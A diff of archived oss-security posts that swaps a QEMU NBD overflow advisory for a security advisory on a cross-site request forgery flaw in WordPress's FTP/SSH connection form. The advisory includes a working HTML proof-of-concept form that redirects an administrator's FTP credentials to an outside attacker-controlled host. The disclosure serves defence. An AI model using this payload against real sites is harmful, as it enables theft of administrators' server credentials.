@@ -1,34 +1,95 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/15/2
-Message-ID: <alpine.LFD.2.20.1702151522560.17523@wniryva>
-Date: Wed, 15 Feb 2017 15:26:03 +0530 (IST)
-From: P J P <ppandit@...hat.com>
-To: oss security list <oss-security@...ts.openwall.com>
-cc: Eric Blake <eblake@...hat.com>
-Subject: CVE-2017-2630 Qemu: nbd: oob stack write in client routine drop_sync
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/04/20/4
+Message-ID: <c1e731cf-2841-56d0-4be7-a2ae98edd66e@securify.nl>
+Date: Fri, 21 Apr 2017 00:30:31 +0200
+From: Summer of Pwnage <lists@...urify.nl>
+To: oss-security@...ts.openwall.com
+Subject: Cross-Site Request Forgery in WordPress Connection Information
 Content-Type: text/plain; charset=utf-8
 
-   Hello,
+------------------------------------------------------------------------
+Cross-Site Request Forgery in WordPress Connection Information
+------------------------------------------------------------------------
+Yorick Koster, July 2016
 
-Quick Emulator(Qemu) built with the Network Block Device(NBD) client support 
-is vulnerable to a stack buffer overflow issue. It could occur while 
-processing server's response to a 'NBD_OPT_LIST' request.
+------------------------------------------------------------------------
+Abstract
+------------------------------------------------------------------------
+The FTP/SSH form functionality of WordPress was found to be vulnerable
+to Cross-Site Request Forgery. This vulnerability can be used to
+overwrite the FTP or SSH connection settings of the affected WordPress
+site. An attacker can use this issue to trick an Administrator into
+logging into the attacker's FTP or SSH server, disclosing his/her login
+credentials to the attacker. In order to exploit this vulnerability, the
+attacker has to lure/force a logged on WordPress Administrator into
+opening a malicious website.
 
-A malicious NBD server could use this issue to crash remote NBD client 
-resulting in DoS or potentially execute arbitrary code on client host with 
-privileges of the Qemu process.
 
-Upstream patch:
----------------
-   -> https://lists.gnu.org/archive/html/qemu-devel/2017-02/msg01246.html
+------------------------------------------------------------------------
+OVE ID
+------------------------------------------------------------------------
+OVE-20160717-0004
 
-Reference:
-----------
-   -> https://bugzilla.redhat.com/show_bug.cgi?id=1422415
+------------------------------------------------------------------------
+Tested versions
+------------------------------------------------------------------------
+This issue was successfully tested on the WordPress [2] version 4.5.3 up
+till and including version 4.7.4.
 
-'CVE-2017-2630' is assigned to this issue by Red Hat Inc.
+------------------------------------------------------------------------
+Fix
+------------------------------------------------------------------------
+There is currently no fix available.
 
-Thank you.
---
-Prasad J Pandit / Red Hat Product Security Team
-47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
+------------------------------------------------------------------------
+Introduction
+------------------------------------------------------------------------
+WordPress is web software you can use to create a website, blog, or
+app. It was found that the FTP/SSH form functionality is vulnerable to
+Cross-Site Request Forgery. This vulnerability can be used by an
+attacker to overwrite the FTP or SSH connection settings of the affected
+WordPress site. It can be used to trick in an Administrator into login
+into the attacker's FTP or SSH server, disclosing his/her login
+credentials to the attacker.
+
+------------------------------------------------------------------------
+Details
+------------------------------------------------------------------------
+This issue exists in the method request_filesystem_credentials()
+(/wp-admin/includes/file.php). It allows overwriting of the values:
+
+- hostname
+- username
+- connection_type
+
+The request_filesystem_credentials() method is called in various
+locations in WordPress. The connection information is updated if a POST
+request contains a password or public & private key value (in case of
+connection type ssh). In order to trigger this issue, the WordPress
+installation must not be able to write to the wp-content folder. Also,
+the attacker has to lure/force a logged on WordPress Administrator into
+opening a malicious website.
+
+------------------------------------------------------------------------
+Proof of concept
+------------------------------------------------------------------------
+<html>
+	<body>
+		<form action="http://<target>/wp-admin/plugins.php" method="POST">
+			<input type="hidden" name="hostname" value="sumofpwn.nl" />
+			<input type="hidden" name="connection_type" value="ftp" />
+			<input type="hidden" name="password" value="password" />
+			<input type="submit" value="Submit request" />
+		</form>
+	</body>
+</html>
+------------------------------------------------------------------------
+References
+------------------------------------------------------------------------
+[1] 
+https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html
+[2] https://wordpress.org/
+------------------------------------------------------------------------
+Summer of Pwnage (https://sumofpwn.nl) is a Dutch community project. Its
+goal is to contribute to the security of popular, widely used OSS
+projects in a fun and educational way.
